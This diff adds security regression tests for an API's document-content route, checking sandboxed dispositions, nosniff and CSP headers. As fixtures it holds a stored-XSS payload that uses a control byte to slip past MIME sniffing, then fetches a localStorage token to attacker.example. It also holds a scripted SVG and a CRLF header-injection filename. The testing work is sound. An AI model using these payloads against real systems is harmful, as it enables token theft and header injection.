@@ -285,6 +285,232 @@ describe('GET /api/v1/documents/{id}/content', () => {
   });
 });
 
+/* ============================================================================================== */
+/* The sandboxed disposition (hardening H4)                                                         */
+/* ============================================================================================== */
+
+/**
+ * The Phase 2 review's stored-XSS proof, as a test.
+ *
+ * The chain it walks is worth restating, because each link looks harmless: `sniffMagic` returns
+ * `null` for any byte sequence holding a control character below 0x09; `sniffMimeType` then falls
+ * through to the *filename's* extension; `htm`/`html` map to `text/html`; and the content route
+ * used to answer with `Content-Disposition: inline` and that type, on the API's own origin, with no
+ * `nosniff` and no CSP. The filename is attacker-chosen — a zip member name or a MIME `filename`
+ * parameter — so the whole of it is one uploaded file away. With `RECUEIL_REQUIRE_AUTH=false`, the
+ * default, the script that runs has full scopes on `/api/v1`.
+ *
+ * The bytes below are the review's, with the `\x01` that defeats the sniffer.
+ */
+const HOSTILE_HTML = Buffer.concat([
+  Buffer.from('<!--', 'utf8'),
+  Buffer.of(0x01),
+  Buffer.from(
+    '--><script>fetch("https://attacker.example/"+localStorage.getItem("recueil.token"))</script><h1>Invoice</h1>',
+    'utf8',
+  ),
+]);
+
+/** A one-pixel GIF: a type the reader has to be able to show inline. */
+const GIF = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
+
+const uploadBytes = async (
+  h: Awaited<ReturnType<typeof harness>>,
+  filename: string,
+  bytes: Buffer,
+  contentType = 'application/octet-stream',
+): Promise<Record<string, unknown>> => {
+  const form = multipart({ name: 'file', filename, contentType, bytes });
+  const response = await h.app.inject({
+    method: 'POST',
+    url: '/api/v1/documents',
+    headers: form.headers,
+    payload: form.payload,
+  });
+  return body(response).document as Record<string, unknown>;
+};
+
+describe('the content route serves stored bytes from a sandbox', () => {
+  it('will not serve attacker HTML inline on its own origin', async () => {
+    const h = await harness();
+    try {
+      const document = await uploadBytes(h, 'invoice.html', HOSTILE_HTML);
+      // The library really did type it as HTML from the filename: this is the state the review
+      // reached, not a weakened version of it.
+      expect(document.mimeType).toBe('text/html');
+      expect(document.mimeSource).toBe('extension');
+
+      const served = await h.app.inject({
+        method: 'GET',
+        url: `/api/v1/documents/${document.id as string}/content`,
+      });
+
+      expect(served.statusCode).toBe(200);
+      // Not renderable as a document, by every mechanism at once.
+      expect(served.headers['content-disposition']).toMatch(/^attachment;/u);
+      expect(served.headers['content-type']).toBe('application/octet-stream');
+      expect(served.headers['x-content-type-options']).toBe('nosniff');
+      expect(served.headers['content-security-policy']).toContain("default-src 'none'");
+      expect(served.headers['content-security-policy']).toContain("script-src 'none'");
+      expect(served.headers['content-security-policy']).toContain('sandbox');
+      expect(served.headers['x-frame-options']).toBe('DENY');
+      // The bytes are still the bytes: this is a disposition change, not censorship.
+      expect(served.rawPayload.equals(HOSTILE_HTML)).toBe(true);
+    } finally {
+      await h.close();
+    }
+  });
+
+  it('will not serve an SVG inline either', async () => {
+    const h = await harness();
+    try {
+      // The other way to choose the type: the sniffer declines (a control character again) and the
+      // *declared* type wins, which is the uploader's `Content-Type` header. An SVG is a document
+      // with a script context, so it is off the allow-list for the same reason HTML is.
+      const document = await uploadBytes(
+        h,
+        'logo.svg',
+        Buffer.concat([
+          Buffer.of(0x01),
+          Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'utf8'),
+        ]),
+        'image/svg+xml',
+      );
+      expect(document.mimeType).toBe('image/svg+xml');
+      expect(document.mimeSource).toBe('declared');
+
+      const served = await h.app.inject({
+        method: 'GET',
+        url: `/api/v1/documents/${document.id as string}/content`,
+      });
+      expect(served.headers['content-disposition']).toMatch(/^attachment;/u);
+      expect(served.headers['content-type']).not.toContain('svg');
+      expect(served.headers['x-content-type-options']).toBe('nosniff');
+    } finally {
+      await h.close();
+    }
+  });
+
+  it('serves plain text inline, but only as plain text and only with nosniff', async () => {
+    const h = await harness();
+    try {
+      // The same bytes without the leading control character sniff as text, and text is on the
+      // allow-list — safely, because `nosniff` is what stops a browser deciding it is really HTML.
+      const document = await uploadBytes(
+        h,
+        'logo.svg',
+        Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'utf8'),
+        'image/svg+xml',
+      );
+      expect(document.mimeType).toBe('text/plain');
+      const served = await h.app.inject({
+        method: 'GET',
+        url: `/api/v1/documents/${document.id as string}/content`,
+      });
+      expect(served.headers['content-disposition']).toMatch(/^inline;/u);
+      expect(served.headers['content-type']).toContain('text/plain');
+      expect(served.headers['x-content-type-options']).toBe('nosniff');
+    } finally {
+      await h.close();
+    }
+  });
+
+  it('still serves a PDF inline, in its own type, so the reader and the review preview work', async () => {
+    const h = await harness();
+    try {
+      const document = await uploadBytes(h, 'paper.pdf', PDF, 'application/pdf');
+      const served = await h.app.inject({
+        method: 'GET',
+        url: `/api/v1/documents/${document.id as string}/content`,
+      });
+
+      // `apps/web/src/review/subject-preview.tsx` renders `<object data={contentUrl}
+      // type="application/pdf">`, which needs both of these, and `frame-ancestors` has to admit
+      // the app's own origin or the object is blank.
+      expect(served.headers['content-disposition']).toMatch(/^inline;/u);
+      expect(served.headers['content-type']).toBe('application/pdf');
+      expect(served.headers['x-content-type-options']).toBe('nosniff');
+      expect(served.headers['content-security-policy']).toContain("frame-ancestors 'self'");
+      expect(served.headers['content-security-policy']).not.toContain('sandbox');
+      expect(served.headers['x-frame-options']).toBe('SAMEORIGIN');
+      expect(served.headers['accept-ranges']).toBe('bytes');
+      expect(served.rawPayload.equals(PDF)).toBe(true);
+    } finally {
+      await h.close();
+    }
+  });
+
+  it('still serves an image inline', async () => {
+    const h = await harness();
+    try {
+      const document = await uploadBytes(h, 'scan.gif', GIF, 'image/gif');
+      const served = await h.app.inject({
+        method: 'GET',
+        url: `/api/v1/documents/${document.id as string}/content`,
+      });
+      expect(served.headers['content-disposition']).toMatch(/^inline;/u);
+      expect(served.headers['content-type']).toBe('image/gif');
+    } finally {
+      await h.close();
+    }
+  });
+
+  it('honours ?download=true for a type it would otherwise inline', async () => {
+    const h = await harness();
+    try {
+      const document = await uploadBytes(h, 'paper.pdf', PDF, 'application/pdf');
+      const served = await h.app.inject({
+        method: 'GET',
+        url: `/api/v1/documents/${document.id as string}/content?download=true`,
+      });
+      expect(served.headers['content-disposition']).toMatch(/^attachment;/u);
+      // Still its own type: `?download=true` is a preference about the disposition, not a claim
+      // that the bytes are dangerous.
+      expect(served.headers['content-type']).toBe('application/pdf');
+    } finally {
+      await h.close();
+    }
+  });
+
+  /**
+   * The review's other finding at this route: `original_filename` comes from an archive member
+   * name, which `safe-path.ts` permits to contain CR and LF, and Node's header validation then
+   * threw `ERR_INVALID_CHAR` *inside* `reply.header` — escaping `sendProblem`, answering a raw
+   * Fastify 500 in the second error format, and making the document's bytes permanently
+   * unreachable through the API. A durable denial of access planted by whoever built the zip.
+   */
+  it('serves a document whose filename carries CR and LF', async () => {
+    const h = await harness();
+    try {
+      // Ingested through the library rather than the multipart route, because the vehicle in the
+      // review was a zip member name: `safe-path.ts` rejects NUL, absolute paths and `..` and
+      // permits CR and LF, so the archive extractor hands exactly this string to `ingestBuffer`.
+      // A multipart `filename` parameter cannot even carry a CRLF — the part header would not
+      // survive it — so uploading is the one way in that this string cannot come from.
+      const { document } = await h.recueil.documents.ingestBuffer(PDF, {
+        sourceKind: 'folder',
+        originalFilename: 'note\r\nX-Injected: yes\r\n\r\nBODY.pdf',
+      });
+      expect(document.originalFilename).toContain('X-Injected');
+
+      const served = await h.app.inject({
+        method: 'GET',
+        url: `/api/v1/documents/${document.id}/content`,
+      });
+
+      expect(served.statusCode).toBe(200);
+      const disposition = served.headers['content-disposition'] as string;
+      // No CR and no LF is the whole of it: Node's own header validation is what stopped this from
+      // being response splitting, and relying on it left the document unreachable instead.
+      expect(disposition).not.toMatch(/[\r\n]/u);
+      expect(disposition).toMatch(/^inline;/u);
+      expect(served.rawPayload.equals(PDF)).toBe(true);
+    } finally {
+      await h.close();
+    }
+  });
+});
+
 describe('attachments', () => {
   const uploadTo = async (
     h: Awaited<ReturnType<typeof harness>>,
